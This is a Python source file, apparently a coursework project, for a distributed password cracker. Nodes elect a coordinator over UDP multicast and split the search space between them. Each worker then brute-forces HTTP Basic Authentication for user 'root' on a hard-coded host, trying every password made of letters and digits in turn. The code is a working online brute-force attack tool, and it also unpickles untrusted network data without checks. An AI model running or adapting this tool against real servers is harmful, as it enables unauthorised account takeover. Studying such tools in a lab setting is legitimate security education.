import time
import base64
import pickle
import struct
import socket
import string
import sys
import logging
import argparse
import selectors

MCAST_GRP = '224.3.29.71'
MCAST_PORT = 5007
IS_ALL_GROUPS = False

class Slave:
    """Chat Client process."""
    MAX_PEERS = 3

    def __init__(self,host: str = "0.0.0.0", port: int = 8000, charList: str = [], user_name: str = "root", min_size: int = 1):
        """Initializes chat client."""                                          
        # Slave inner data
        self.isCord = False                                                                                 # is coordinator
        self.inElection = True                                                                              # there is an election ongoing
        self.user_name = user_name                                                                          # Username to be used on the login
        self.charList = charList                                                                            # Charlist used for composing passwords
        self.offset = 1                                                                                     # initialize offset for later on change it for what coordinator wants
        self.pswd = charList[0]                                                                             # initialize pswd for later on change it for what coordinator wants
        self.timeout = 5                                                                                    #
        self.done_UDP = False                                                                               #
        self.CordTime = -1                                                                                  #
        self.max_wait = 5                                                                                   #
        self.index = -1                                                                                     #

        # Coordinator
        self.workers = []
        self.max_workers = 3
        self.min_size = min_size                                                                            # minimum size of password's size

        # Global info
        self.peers = []                                                                                     # set of peers in the network
        self.pswds = [None for i in range(self.max_workers)]                                                #
        self.aliveTimes = [None for i in range(self.max_workers + 1)]                                       # pswds list tried until now

        # Server info
        self._host = host
        self._port = port 

        # Socket info
        self.socketcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #Multicast info
        global MCAST_GRP
        global MCAST_PORT
        self.mreq = struct.pack('b',1)
        self.sockUDP = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                                     # socket UDP
        self.sockUDP.settimeout(self.timeout)
        self.sockUDP.bind(('', MCAST_PORT))
        group = socket.inet_aton(MCAST_GRP)
        mreq = struct.pack('4sl', group, socket.INADDR_ANY)
        self.sockUDP.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.sockUDP.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_LOOP,0)
        hostname = socket.gethostname()
        self.address = socket.gethostbyname(hostname)
        self.port = int(socket.getnameinfo(self.sockUDP.getsockname(), socket.NI_NUMERICHOST | socket.NI_NUMERICSERV)[1])
        self.ID = hash(self.address.__str__())
        self.logger = logging.getLogger(f"Slave {self.ID}")
    
    def seenIT(self, time, ID):
        if ID == "CORD":
            self.aliveTimes[-1] = time
        else:
            self.aliveTimes[ID] = time

    def isAlive(self):
        for TIME in self.aliveTimes:
            if TIME != None and time.time() - TIME > self.max_wait:
                return False
        return True

    def sendPswd(self, pswd):
        try:
            self.socketcp.connect((self._host, self._port))
        except:
            pass
        #self.socketcp.setblocking(False)
        lines = [
            'GET / HTTP/1.1',
            'Host: {}'.format(self._host),
            'Authorization: Basic {}'.format(base64.b64encode('{}:{}'.format(self.user_name, pswd).encode('ascii')).decode('ascii')),
            'Connection: keep-alive'
        ]
        request = '\r\n'.join(lines)+'\r\n\r\n'
        self.socketcp.send(request.encode('utf-8'))

    def rsvResponse(self):
        time.sleep(1)
        result = self.socketcp.recv(1024)
        try:
            result = result.decode('utf-8')
            result.split("\n")[-3]
        except:
            return True
        return False

    def run(self):
        global MCAST_GRP
        global MCAST_PORT

        connectionMessage = {
                "COMMAND":"CON",
                "ID":self.ID,
                "IP":(self.address,self.port)
                }
        #print("send first con")
        self.sockUDP.sendto(pickle.dumps(connectionMessage),(MCAST_GRP,MCAST_PORT))                         # Send connection message
        self.peers.append(self.ID)                                                                          # Append our data to the peers list

        while not self.done_UDP:                                                                            # until done
            try:                                                                                            # try to receive
                payload, addr = self.sockUDP.recvfrom(1024)                                                 # get message 
            except socket.timeout:                                                                          # if timed out
                payload, addr = None, None                                                                  # message is set to none

            if payload is not None:                                                                         # message was received, check if we need an election
                output = pickle.loads(payload)   
                if output["COMMAND"] == "CON":
                    self.inElection = True
                    self.peers = []
                    self.aliveTimes = [None for i in range(self.max_workers)]
                    self.peers.append(self.ID)                                                              # Append our data to the peers list
                    #print("received connection message")

            if(self.inElection): 
                #print("IN ELECTION")
                if payload is not None:                                                                     # message was received, starts connection

                    if output["COMMAND"] == "CON":                                                
                        if self.ID > output["ID"]:                                                          # if our ID is bigger than the one we received 
                            connectionMessage = {                                                           
                                    "COMMAND":"CON",
                                    "ID":self.ID,
                                    "IP":(self.address,self.port)
                                    }
                            self.sockUDP.sendto(pickle.dumps(connectionMessage),(MCAST_GRP,MCAST_PORT))     # send con message
                            self.isCord = True                                                              # we set our role as coordinator
                        else:                                                                               # if our ID is lower
                            self.isCord = False                                                             # we set our role as slave
                    
                    if output["COMMAND"] == "CORD":                                                         # If someone anounced that he is the cordinator
                        self.inElection = False                                                             # we arent in an election
                        #print("Election ended")
                else:                                                                                       # CON TIMEOUT then slave is cordinator
                    coordinatorMessage = {                                                           
                        "COMMAND":"CORD",
                        "ID":self.ID,
                        "IP":(self.address,self.port)
                    }
                    self.sockUDP.sendto(pickle.dumps(coordinatorMessage),(MCAST_GRP,MCAST_PORT))            # send message that we are cordinato
                    self.inElection = False                                                                 # we arent in an election
                    discoverMessage = {                                                           
                        "COMMAND":"DISC",
                        "ID":self.ID,
                        "IP":(self.address,self.port)
                    }
                    self.sockUDP.sendto(pickle.dumps(discoverMessage),(MCAST_GRP,MCAST_PORT))               # send discovery message to discover peers around us
                    #print("Sent Discovery message")
            else:   
                print(f"[1] PSWDS: {self.pswds}")                                                                                        # We are not in an election
                # Reccon System
                if payload is not None:
                    if output["COMMAND"] == "DISC":                                                         # If we were sent a Discovery message
                        #print("received discover message")
                        if(len(self.peers) == 1):                                                           # If we didnt send a Discovery message already
                            discoverMessage = {                                                           
                                "COMMAND":"DISC",
                                "ID":self.ID,
                                "IP":(self.address,self.port)
                            }
                            self.sockUDP.sendto(pickle.dumps(discoverMessage),(MCAST_GRP,MCAST_PORT))       # Send discovery message
                        if output["ID"] not in self.peers:                                                  # If we didnt have this peer in the peer list
                            self.peers.append(output["ID"])                                                 # We add him to the peer list
                        continue                                                                            # break out so that we dont work just now

                # Work distribution
                if(self.isCord):                                                                            # If we are Coordinator
                    # try to distribute work
                    if self.aliveTimes[0] == None:                                                          # No work has been given yet  
                        if len(self.peers) > 1:                                                             # We arent alone
                            self.workers = self.peers.copy()
                            self.workers.remove(self.ID)
                            self.workers.sort()                                                             # Workers we are going to work with

                            # We filter the max number of workers we can have
                            if len(self.workers) > self.max_workers:
                                self.workers = self.workers[:self.max_workers]

                            # Send first work
                            count = 0
                            for worker in self.workers:
                                self.seenIT(time.time(), count)
                                if self.pswds[count] == None:
                                    pswd = getPswds(self.charList, count, self.charList[0]*self.min_size)
                                else: 
                                    pswd = getPswds(self.charList, len(self.workers), self.pswds[count])

                                workMessage = {                                                           
                                    "COMMAND":"WORK",
                                    "INDEX": count,
                                    "PSWD": pswd,                                                            # First password to try
                                    "ID": worker,
                                }
                                count +=1
                                self.sockUDP.sendto(pickle.dumps(workMessage),(MCAST_GRP,MCAST_PORT))
                                #print(f"Sent work to ID: {worker}")

                    # Receive work done                                                                  
                    if payload is not None:
                        if output["COMMAND"] == "DONE":                                                         # If we were sent a Done message
                            pswd = output["PSWD"]
                            index = output["INDEX"]
                            self.pswds[index] = pswd
                            workMessage = {                                                           
                                    "COMMAND":"WORK",
                                    "INDEX": index,
                                    "PSWD": getPswds(self.charList, len(self.workers), pswd),                                                            
                                    "ID": output["ID"],
                                }
                            self.sockUDP.sendto(pickle.dumps(workMessage),(MCAST_GRP,MCAST_PORT))
                            
                    else:                                                                                   # Check if someone possibly died
                        if not self.isAlive():
                            connectionMessage = {                                                           
                                "COMMAND":"CON",
                                "ID":self.ID,
                                "IP":(self.address,self.port)
                            }
                            self.sockUDP.sendto(pickle.dumps(connectionMessage),(MCAST_GRP,MCAST_PORT))        # send con message
                            self.peers = []
                            self.aliveTimes = [None for i in range(self.max_workers)]
                            self.peers.append(self.ID)                                                              # Append our data to the peers list
                            self.inElection = True
                            break
                else:                                                                                       # If we are Slave
                    if payload is not None:
                        if output["COMMAND"] == "WORK":                                                     # If we were sent a Work message
                            self.seenIT(time.time(), "CORD")
                            if output["ID"] == self.ID:                                                     # We work
                                self.pswd = output["PSWD"]                                                  #
                                self.index = output["INDEX"]                                                #
                                #print(f"worker ID: {self.ID} aka {self.index} received work for {self.pswd}")
                                print(f"Trying: {self.pswd}")
                                # Mandar mensagem
                                self.sendPswd(self.pswd)

                                # Receber mensagem
                                if not self.rsvResponse():
                                    # Mandar DONE work
                                    doneMessage = {  
                                            "COMMAND":"DONE",                                                         
                                            "INDEX": self.index,
                                            "PSWD": self.pswd,                                                  # First password to try
                                            "ID": self.ID,
                                    }
                                    self.pswds[self.index] = self.pswd
                                    self.sockUDP.sendto(pickle.dumps(doneMessage),(MCAST_GRP,MCAST_PORT))       # send done message
                                else:
                                    founditMessage = {  
                                            "COMMAND":"FOUNDIT",
                                            "PSWD": self.pswd,
                                    }
                                    self.pswds[self.index] = self.pswd
                                    self.sockUDP.sendto(pickle.dumps(founditMessage),(MCAST_GRP,MCAST_PORT))       # send FOUNDIT message
                                    sys.exit(12)
                                #print(f"worker ID: {self.ID} aka {self.index} did work for {self.pswd}")

                        if output["COMMAND"] == "DONE":                                                    #  
                            index = output["INDEX"]
                            pswd = output["PSWD"]
                            self.seenIT(time.time(), index)
                            self.pswds[index] = pswd

                        if output["COMMAND"] == "FOUNDIT":                                                  # Our work is done
                            pswd = output["PSWD"]
                            print(f"PASSWORD: {pswd}")
                            sys.exit(12)
                    
                    # Check Alive
                    if not self.isAlive():                                                                                       # Some worker died
                        connectionMessage = {                                                           
                            "COMMAND":"CON",
                            "ID":self.ID,
                            "IP":(self.address,self.port)
                        }
                        self.sockUDP.sendto(pickle.dumps(connectionMessage),(MCAST_GRP,MCAST_PORT))                              # send con message
                        self.peers = []
                        self.aliveTimes = [None for i in range(self.max_workers)]
                        self.peers.append(self.ID)                                                                               # Append our data to the peers list
                        self.inElection = True



    def receive(self, socket):
        """Receives server response"""
        result = socket.recv(1024)
        try:
            result = result.decode('utf-8')
            result.split("\n")[-3]
        except:
            print("FOUND IT")
            self.done = True

def getPswds(charlist, increment, pswd):                                                                    # Funtion to generate the next password to try it on tthe server
    """Gives next password to test given a previous one, uncrement and charlist"""
    limit = len(charlist)                                                   
    for k in range(increment):
        remain = 1
        new_pswd = list(pswd)
        for i in range(len(new_pswd)-1,-1,-1):
            if (charlist.index(new_pswd[i]) + remain) >= limit:
                if(i != 0):
                    new_pswd[i] = charlist[0]
                    remain = 1
                else:
                    new_pswd[i] = charlist[0]
                    new_pswd.insert(0, charlist[0])
                    remain = 0
            else:
                new_pswd[i] = charlist[charlist.index(new_pswd[i]) + remain]
                remain = 0
            if remain == 0: break
        pswd = "".join(new_pswd)
    return pswd


def hash(text, seed=0, maximum=2**10):                                                                      # Hash function for ID creation
    """ FNV-1a Hash Function. """
    fnv_prime = 16777619
    offset_basis = 2166136261
    h = offset_basis + seed
    for char in text:
        h = h ^ ord(char)
        h = h * fnv_prime
    return h % maximum

def main():
    charList = string.ascii_letters + string.digits                                                         # charlist to be used on password creation
    #    ARGS: Host | Port | charlist | user_name
    s = Slave("10.0.2.15", 8000, charList)
    s.run()   

if __name__ == "__main__":
    main()
